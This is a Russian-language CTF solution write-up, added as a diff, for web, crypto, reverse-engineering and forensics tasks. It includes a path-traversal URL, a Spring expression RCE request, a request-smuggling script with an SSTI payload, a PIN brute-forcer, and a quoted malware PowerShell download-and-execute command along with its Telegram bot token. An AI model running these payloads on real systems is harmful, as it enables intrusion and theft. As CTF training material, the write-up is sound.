@@ -1,0 +1,220 @@
+WEB-1
+
+
+На сайте можно найти подсказку (http://192.168.12.10:5001/download?file_type=file1.txt), в которой говорится, что флаг находится etc/secret.
+Для скачивания файла из /etc/secret нужно использовать directory traversal: http://192.168.12.10:5001/download?file_type=../../etc/secret
+
+
+WEB-2
+
+
+В декомпилированном приложении видимо, что метод getDocument не возвращает значения, с помощью гугла можно понять, что этот метод уязвим к View Manipulation Vulnerability (https://www.veracode.com/blog/secure-development/spring-view-manipulation-vulnerability), код можно выполнить через GET http://192.168.12.13:8090/doc/__${code here}__::.x. Метод login читает adminPassword из файла password.txt, но если его нет, adminPassword равняется password. Можно удалить password.txt и залогиниться с паролем password.
+1) GET http://192.168.12.13:8090/doc/__$%7BT(java.lang.Runtime).getRuntime().exec(%22rm%20password.txt%22)%7D__::.x
+2) GET http://192.168.12.13:8090/login?password=password
+
+
+
+WEB-3
+
+
+Для обхода проверки в haproxy нужно использовать request smuggling, а сам сайт уязвим к SSTI
+
+
+import socket
+import urllib.parse
+
+string = '''{{request.application.__globals__.__builtins__.eval("open('flag.txt', 'r').read()")}}'''
+if len(string) > 100:
+    print(len(string))
+    raise RuntimeError
+string = urllib.parse.quote_plus(string)
+path = '/flag?name=' + string
+
+payload = f"GET / HTTP/1.1\r\nHost: localhost\r\nContent-Length: {63 + len(path)}\r\nSec-Websocket-Key1: x\r\n\r\nxxxxxxxxGET {path} " \
+          "HTTP/1.1\r\nHost: localhost\r\nContent-Length: 35\r\n\r\nGET / HTTP/1.1\r\nHost: localhost\r\n\r\n"
+with socket.socket() as sock:
+    sock.connect(('192.168.12.11', 8001))
+    sock.send(payload.encode())
+    while d := sock.recv(102400):
+        print(d.decode())
+
+
+
+CRYPTO-1
+
+В данном задании можно было перебрать все возможные pin-коды (10000) и получить флаг
+
+
+import requests
+
+url = 'http://192.168.12.12:5000/api'
+
+
+session = requests.Session()
+
+
+def get_pin():
+    return session.get(url + '/EncryptedPin').json()
+
+
+def encrypt_pin(pin):
+    return session.post(url + '/EncryptPin', json={'pin': pin}).json()
+
+
+def get_time():
+    return session.get(url + '/Time').json()
+
+
+def check_pin(pin):
+    return session.post(url + '/CheckPin', json={'pin': pin}).content
+
+
+for i in range(10000):
+    res = check_pin(i)
+    if not res.startswith(b'<!doctype html>\n<html lang=en>\n<title>500 Inte'):
+        print(res)
+    else:
+        if i % 1000 == 0:
+            print(i)
+
+
+
+REV-1
+
+Алгоритм вычисляет хеш-сумму каждых 2 последовательных символов и сравнивает ее с суммой 2 символов флага (она есть в бинарнике)
+Задание решается перебором, нужно только переписать алгоритм на любой удобный язык программирования
+
+
+#rev 1
+# Function to calculate CRC32 checksum
+def crc32(data):
+    crc = 0xffffffff
+    for byte in data:
+        crc ^= byte
+        for _ in range(8):
+            if crc & 1:
+                crc = (crc >> 1) ^ 0xedb88320
+            else:
+                crc >>= 1
+    return crc ^ 0xffffffff
+ 
+# Given encrypted flag bytes
+flag_encrypt = [0xf3, 0xe1, 0xcf, 0xed, 0x23, 0xcd, 0x6b, 0x64, 0x57, 0xad, 0xf9, 0x50, 0xe1, 0xb1, 0x99, 0xf2, 0xe4, 0xb6, 0xa9, 0xc6, 0x4c, 0x61, 0x80, 0x32, 0x02, 0x2b, 0x77, 0x93, 0x43, 0x3a, 0x2c, 0xab, 0x6a, 0x93, 0x0d, 0x2a, 0xd4, 0x14, 0xfa, 0x1b, 0x2f, 0x6f, 0x5d, 0x25, 0x6b, 0xf6, 0x47, 0xc4, 0xf5, 0x6c, 0xd9, 0x5a, 0x12, 0xad, 0x64, 0xe9]
+ 
+# Decrypting the flag
+flag_decoded = []
+for i in range(0, len(flag_encrypt), 4):
+    crc = int.from_bytes(flag_encrypt[i:i+4], byteorder='little')
+    for k in range(0xff+1):
+        for m in range(0xff+1):
+            inp = bytes([k, m])
+            if crc32(inp) == crc:
+                flag_decoded.extend(inp)
+                break
+ 
+# Convert decrypted bytes to string
+flag = ''.join([chr(byte) for byte in flag_decoded])
+print(flag)
+
+
+FORENSICS
+1) ВПО попало на компьютер через почту, об этом сказано в легенде, это также можно понять из расположения архива с ВПО (Z:\Evgeniy\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\CQ2HQVTU\)
+
+2) В журнале событий powershell можно найти команду, скачивающую файл http://95.169.192.220:8080 (либо можно открыть файл, содержащий уязвимость, в нем есть команда $drop=Join-Path -Path $env:APPDATA -ChildPath Rjomba.exe);(New-Object System.Net.WebClient).DownloadFile('http://95.169.192.220:8080/prikol.exe', $drop); Start-Process -Verb runAs $drop")
+
+3) google winrar cve -> https://habr.com/ru/articles/797127/ (CVE-2023-38831, описание совпадает с содержимым архива)
+
+4) Используем ghidra, дизассемблируем функции и видим вызовы к IsProcessorFeaturePresent, IsDebuggerPresent и CheckRemoteDebuggerPresent
+
+6) Используем strings на дамп памяти и ищем все строки с длиной в 32 байта. Одна из таких строк - amogusamogusamogusamogusamogusam, которая и является ключом (можно проверить расшифровкой файла)
+
+5) Расшифровываем pass.txt.ransom в режиме CBC без iv и видим, что второй блок расшифровался успешно, в отличие от первого; в режиме CBC plaintext xorится с ciphertext предыдущего блока, что объясняет, почему второй блок был успешно расшифрован; также мы видим padding во втором блоке, следовательно, применяемый режим AES - не потоковый, а блочный, то есть, используется действительно CBC
+
+7) Запускаем wireshark на хосте (не в виртуальной машине) и видим dns-запросы с api.telegram.org после запуска ВПО (исполняемый файл есть в папке %temp%); Используем mitmproxy и пробную версию proxifier и видим запрос к [https://api.telegram.org/bot7029575943:AAFNYmmW_QqqMcaHZ-DFRn3M05DptExeAGE/sendDocument](https://api.telegram.org/bot7029575943:AAFNYmmW_QqqMcaHZ-DFRn3M05DptExeAGE/sendDocument), аутентификация происходит с помощью токена (bot7029575943:AAFNYmmW_QqqMcaHZ-DFRn3M05DptExeAGE), который находится в URL
+
+8) Исходя из того, что ключ - строка, дополненная до длины ключа, можно предположить, что iv имеет тот же вид. Берем все строки из дампа памяти с длиной <= 16, которые содержат только символы A-z и 0-9, убираем названия функций из библиотек и пытаемся расшифровать pass с iv=строке для каждой из них, затем фильтруем расшифрованные пароли,
+ чтобы они содержали только частовстречаемые в паролях символы.
+Получаем несколько возможных паролей и iv, большинство iv - части base64-encoded строк, их можно убрать.
+Получаем 3 интересных вектора инициализации - abababababababab, telvvtelvvtelvvt и ctnitctnitctnitc,
+начальные символы первого вектора в отсортированных строках из дампа находится рядом с ключом, к тому же у него наименьший пероид, поэтому берем его, соответствующий ему пароль - sFYZ#2z9VdUR9sm`3JRz
+
+
+
+import base64
+
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
+
+key = b'amogusamogusamogusamogusamogusam'
+a = 'K0uvQoK4IHyTxMGgFXcWFdYEPqZzSTO8G79diypFSlU='
+a = base64.b64decode(a)
+
+
+def decrypt(iv):
+    aes = AES.new(key=key, mode=AES.MODE_CBC, iv=iv)
+    return unpad(aes.decrypt(a), 32)
+
+
+l = list(b'0987654321poiuytrewqlkjhgfdsamnbvcxzPOIUYTREWQLKJHGFDSAMNBVCXZ')
+pwdsymbols = b'poiuytrewqlkjhgfdsamnbvcxzPOIUYTREWQLKJHGFDSAMNBVCXZ0987654321`~!@#$%^&*'
+
+
+def check(e1):
+    if len(e1) > 16:
+        return False
+    for e in e1:
+        if e not in l:
+            return False
+    return True
+
+
+def check2(el1):
+    for e in el1:
+        if e not in pwdsymbols:
+            return False
+    return True
+
+
+def to_16(s):
+    s = s * 16
+    return s[:16]
+
+
+available = set()
+with open('/home/kali/Desktop/shared/s.txt', 'r') as file:  # strings from the memdump
+    for el in file:
+        el = el.strip().encode()
+        if not check(el):
+            continue
+        available.add(to_16(el))
+available.remove(b'')
+library_names = ['qsort', 'acosh', 'btowc', 'cimag', 'acosf', 'abort', 'short', 'about',
+                 'atan', 'round', 'ccosf', 'cpowf', 'ccosh', 'roundf', 'DispatchMessageW', 'Heap32ListFirst',
+                 'SetShellWindowEx', 'CVListLocalPath', 'WinStationShadow', 'werShell',
+                 'CoLoadLibrary', 'GetTaskmanWindow', 'ftyphevc', 'Annotation', 'SetTaskmanWindow', 'FwSidsToString',
+                 'ftypheix',
+                 'ftypavci', 'DeviceIoControlD', 'RebaseOnVolumeID', 'PtVisible', 'Scripting',
+                 'GetMsgClassEnumG', 'GetShellWindowGe', 'Transitions', 'ReportInertia', 'Separator',
+                 'qDuration', 'DefSubclassProcD', 'ftypheic', 'StatusCode', 'RemoveLookasideR',
+                 'DispatchMessageA', 'DirAddEntry', 'LsaOfflineDelete', 'SqmAddToAverage',
+                 'lstrcat', 'statusBits', 'RemoteWipe', 'statusCodestatus']
+for el in library_names:  # remove strings from libraries
+    available.remove(to_16(el.encode()))
+
+for el in available:
+    pwd = decrypt(el)
+    if check2(pwd):
+        print(pwd, el)
+
+# b'pbvQ#`BkU@zY9!U23JRz' b'bFNia0Y0bFNia0Y0'
+# b'CHHo#*^kfjDg9kI23JRz' b'QlpWazE0QlpWazE0'
+# b'fATN4$~7Ap@U4gzv3JRz' b'telvvtelvvtelvvt' - interesting
+# b'sFYZ#2z9VdUR9sm`3JRz' b'abababababababab' - interesting, least period
+# b'HcTv#*MmmAX~9kZ43JRz' b'ZGlNazV6ZGlNazV6'
+# b'FHjv#*^jcjf~9kI33JRz' b'TlRNazE1TlRNazE1'
+# b'sTJW&%x8^gDB7uya3JRz' b'aproducciaproduc'
+# b'wbvQ#`tiR@zY9!c03JRz' b'eFNia0o2eFNia0o2'
+# b'qPVQ63o5^rWD6xxa3JRz' b'ctnitctnitctnitc'  - interesting
+
+
+Расшифрованный пароль - sFYZ#2z9VdUR9sm`3JRz'
